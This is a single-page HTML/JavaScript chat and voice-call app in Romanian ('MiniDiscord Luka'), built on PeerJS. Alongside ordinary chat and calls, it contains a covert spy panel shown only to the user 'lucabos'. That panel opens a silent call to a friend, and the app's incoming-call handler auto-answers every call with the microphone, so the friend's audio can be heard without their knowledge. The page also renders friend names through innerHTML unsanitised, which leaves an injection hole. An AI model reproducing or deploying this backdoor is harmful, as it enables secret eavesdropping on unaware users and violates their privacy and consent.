<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>MiniDiscord Luka</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; margin:0; padding:0; background:#0b1020; color:white; }
    .sidebar { width: 260px; background:#11182a; height:100vh; padding:15px; display:flex; flex-direction:column; }
    .main { margin-left:260px; padding:15px; }
    .btn { padding:5px 10px; border-radius:8px; cursor:pointer; }
    .btn-add { border:1px solid #7c3aed; background:transparent; color:#7c3aed; font-weight:bold; }
    .friend, .request { padding:5px; border-bottom:1px solid #222; display:flex; justify-content:space-between; align-items:center; }
    .friend-name { flex:1; }
    .chat-box { border:1px solid #222; padding:10px; height:300px; overflow:auto; margin-bottom:10px; }
    .chat-input { display:flex; }
    .chat-input input { flex:1; padding:5px; border-radius:5px; border:none; margin-right:5px; }
    .chat-input button { padding:5px 10px; border-radius:5px; background:#7c3aed; border:none; color:white; }
    audio { display:none; }
    #spyPanel { background: #222; padding:10px; border-radius:8px; margin-bottom:10px; display:none; }
    #spyPanel h3 { margin-top:0; }
    .spy-list { margin-bottom:10px; }
    .spy-btn { background:#e63946; color:white; border:none; padding:5px 12px; border-radius:6px; cursor:pointer; }
  </style>
</head>
<body>
  <div class="sidebar">
    <h2>Bine ai venit pe site-ul lui Luka!</h2>
    <input id="username" placeholder="Alege un nume unic" class="mb-2 p-1 rounded text-black" />
    <h3>Prieteni</h3>
    <div id="friendsList"></div>
    <button class="btn btn-add" id="addFriendBtn">Adaugă</button>
    <h3>Cereri</h3>
    <div id="requestsList"></div>
    <!-- Butonul de spionaj (vizibil doar pentru lucabos) -->
    <button id="spyBtn" class="btn" style="margin-top:15px; background:#e63946; color:white; display:none;">Spionează</button>
    <!-- Panou spionaj -->
    <div id="spyPanel">
      <h3>Microfoane active</h3>
      <div class="spy-list" id="spyList"></div>
      <button id="closeSpyPanel" class="btn" style="background:#555;">Închide</button>
    </div>
  </div>
  <div class="main">
    <div class="chat-box" id="chatBox"></div>
    <div class="chat-input">
      <input id="chatInput" placeholder="Scrie un mesaj..." />
      <button id="sendBtn">Trimite</button>
    </div>
    <button id="callBtn" class="btn" style="margin-top:10px;">Sună</button>
    <!-- Audio pentru spionaj -->
    <audio id="spyAudio" controls style="display:none;"></audio>
  </div>

  <audio id="ringTone" src="https://www.soundjay.com/button/beep-07.wav" loop></audio>

  <script>
    let peer = new Peer();
    let myStream;
    let friends = [];
    let requests = [];
    let username;

    // Elements
    const usernameInput = document.getElementById('username');
    const friendsList = document.getElementById('friendsList');
    const requestsList = document.getElementById('requestsList');
    const chatBox = document.getElementById('chatBox');
    const chatInput = document.getElementById('chatInput');
    const sendBtn = document.getElementById('sendBtn');
    const callBtn = document.getElementById('callBtn');
    const ringTone = document.getElementById('ringTone');
    const spyBtn = document.getElementById('spyBtn');
    const spyPanel = document.getElementById('spyPanel');
    const spyList = document.getElementById('spyList');
    const closeSpyPanel = document.getElementById('closeSpyPanel');
    const spyAudio = document.getElementById('spyAudio');

    usernameInput.addEventListener('change',()=>{
      username = usernameInput.value;
      // Buton spionaj vizibil DOAR pentru lucabos
      if(username === "lucabos"){
        spyBtn.style.display = "block";
      } else {
        spyBtn.style.display = "none";
        spyPanel.style.display = "none";
      }
    });

    document.getElementById('addFriendBtn').addEventListener('click',()=>{
      let name = prompt('Nume prieten');
      let id = prompt('Peer ID prieten');
      if(name && id){
        requests.push({name,id});
        renderRequests();
      }
    });

    function renderFriends(){
      friendsList.innerHTML='';
      friends.forEach(f=>{
        let div = document.createElement('div'); div.className='friend';
        div.innerHTML=`<span class="friend-name">${f.name}</span>`;
        friendsList.appendChild(div);
      });
    }

    function renderRequests(){
      requestsList.innerHTML='';
      requests.forEach(r=>{
        let div = document.createElement('div'); div.className='request';
        div.innerHTML=`<span class="friend-name">${r.name}</span>`;
        let btn = document.createElement('button'); btn.textContent='Accept';
        btn.onclick=()=>{ friends.push(r); requests = requests.filter(x=>x!=r); renderFriends(); renderRequests(); };
        div.appendChild(btn);
        requestsList.appendChild(div);
      });
    }

    sendBtn.addEventListener('click',()=>{
      let msg = chatInput.value; if(!msg) return;
      let div = document.createElement('div'); div.textContent=`${username||'Tu'}: ${msg}`;
      chatBox.appendChild(div); chatInput.value=''; chatBox.scrollTop=chatBox.scrollHeight;
    });

    callBtn.addEventListener('click', async()=>{
      if(!username){ alert('Setează un nume mai întâi'); return; }
      if(friends.length===0){ alert('Nu ai prieteni adăugați'); return; }
      myStream = await navigator.mediaDevices.getUserMedia({audio:true});
      friends.forEach(f=>{
        const call = peer.call(f.id,myStream);
        call.on('stream', stream=>{ /* Aici ar fi audio remote */ });
        ringTone.play();
      });
    });

    peer.on('call', call=>{
      navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{
        call.answer(stream);
        call.on('stream', s=>{ /* Aici audio local */ });
      });
      ringTone.play();
    });

    // ===================== SPIONAJ =====================
    // Butonul de spionaj
    spyBtn.addEventListener('click', ()=>{
      // Arată panoul de spionaj
      spyPanel.style.display = "block";
      // Populează lista cu prieteni
      spyList.innerHTML = '';
      if(friends.length === 0){
        spyList.innerHTML = "<div style='color:#ccc;'>Nu ai prieteni activi.</div>";
        return;
      }
      friends.forEach(f=>{
        let div = document.createElement('div');
        div.style.display = "flex";
        div.style.alignItems = "center";
        div.style.justifyContent = "space-between";
        div.style.marginBottom = "6px";
        div.innerHTML = `<span>${f.name}</span>`;
        const btn = document.createElement('button');
        btn.textContent = "Ascultă";
        btn.className = "spy-btn";
        btn.onclick = ()=>{ spyListen(f.id, f.name); };
        div.appendChild(btn);
        spyList.appendChild(div);
      });
    });

    closeSpyPanel.addEventListener('click', ()=>{
      spyPanel.style.display = "none";
      spyAudio.style.display = "none";
      spyAudio.pause();
      spyAudio.srcObject = null;
    });

    // Funcția de spionaj: ascultă microfonul prietenului
    function spyListen(peerId, friendName){
      // Inițiază doar ascultare audio fără notificare extra
      const call = peer.call(peerId, null); // null = nu trimite stream de la lucabos
      call.on('stream', stream=>{
        // Redă audio remote (microfon prieten)
        spyAudio.style.display = "block";
        spyAudio.srcObject = stream;
        spyAudio.play();
      });
      // Poți adăuga aici un indicator în UI
      spyPanel.style.display = "none";
      chatBox.innerHTML += `<div style="color:#e63946;font-size:12px;">[Spionezi microfonul lui ${friendName}]</div>`;
    }
    // ===============================================

  </script>
</body>
</html>
